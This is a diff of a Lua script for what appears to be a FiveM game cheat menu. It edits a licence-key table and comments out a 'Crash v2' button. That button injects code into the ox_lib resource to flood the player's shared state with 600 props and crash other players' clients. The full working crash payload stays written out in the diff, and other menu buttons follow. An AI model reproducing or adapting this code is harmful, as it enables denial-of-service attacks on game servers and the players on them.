@@ -9,7 +9,7 @@ local KEYS = {
     ["4909687835420144799"] = { year = 2025, month = 11, day = 22 },  -- luis
     ["4912351135467962038"] = { year = 2025, month = 12, day = 19 },  -- jimmy
     ["4923368873291497769"] = { year = 2025, month = 11, day = 10 },  -- lueoo
-    ["4918287178106807021"] = { year = 2025, month = 11, day = 12 },  -- pikachu
+ --  ["4918287178106807021"] = { year = 2025, month = 11, day = 12 },  -- pikachu
     ["491828807021"] = { year = 2025, month = 10, day = 12 }   -- no one
 }
 
@@ -1475,32 +1475,32 @@ end)
     end)
 
 
-    MachoMenuButton(EventTabSections[3], "Crash v2", function()
-    MachoInjectResourceRaw('ox_lib', [[
-  CreateObject = function()
+--     MachoMenuButton(EventTabSections[3], "Crash v2", function()
+--     MachoInjectResourceRaw('ox_lib', [[
+--   CreateObject = function()
 
-  end
+--   end
 
-  local model <const> = 'p_spinning_anus_s'
-  local props <const> = {}
+--   local model <const> = 'p_spinning_anus_s'
+--   local props <const> = {}  
 
-  for i=1, 600 do
-    props[i] = {
-      model = model,
-      coords = vec3(0.0, 0.0, 0.0),
-      pos = vec3(0.0, 0.0, 0.0),
-      rot = vec3(0.0, 0.0, 0.0)
-    }
-  end
+--   for i=1, 600 do
+--     props[i] = {
+--       model = model,
+--       coords = vec3(0.0, 0.0, 0.0),
+--       pos = vec3(0.0, 0.0, 0.0),
+--       rot = vec3(0.0, 0.0, 0.0)
+--     }
+--   end
 
-  local plyState <const> = LocalPlayer.state
+--   local plyState <const> = LocalPlayer.state
 
-  plyState:set('lib:progressProps', props, true)
-  Wait(1000)
-  plyState:set('lib:progressProps', nil, true)
-]])
-        MachoMenuNotification("Crashed ", ";)")
-    end)
+--   plyState:set('lib:progressProps', props, true)
+--   Wait(1000)
+--   plyState:set('lib:progressProps', nil, true)
+-- ]])
+--         MachoMenuNotification("Crashed ", ";)")
+--     end)
 
 
     MachoMenuButton(EventTabSections[3], "Tug", function()
